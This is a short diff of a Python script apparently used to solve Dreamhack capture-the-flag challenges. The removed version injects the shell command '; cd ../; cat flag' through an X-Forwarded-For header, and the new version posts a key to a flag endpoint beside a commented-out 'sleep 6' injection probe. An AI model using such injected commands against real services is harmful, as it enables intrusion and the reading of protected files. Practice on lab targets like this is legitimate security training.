@@ -1,11 +1,12 @@
 import requests
 
-url = "http://host8.dreamhack.games:14497/"
+url = "http://host3.dreamhack.games:20925/flag"
 
-headers = {
-  'X-Forwarded-For' : '; cd ../; cat flag'
+data = {
+  'key' : '409ac0d96943d3da52f176ae9ff2b974'
+  # 'cmd_input' : "sleep 6"
 }
 
-res = requests.get(url, headers=headers)
+res = requests.post(url, data=data)
 
 print(res.text)
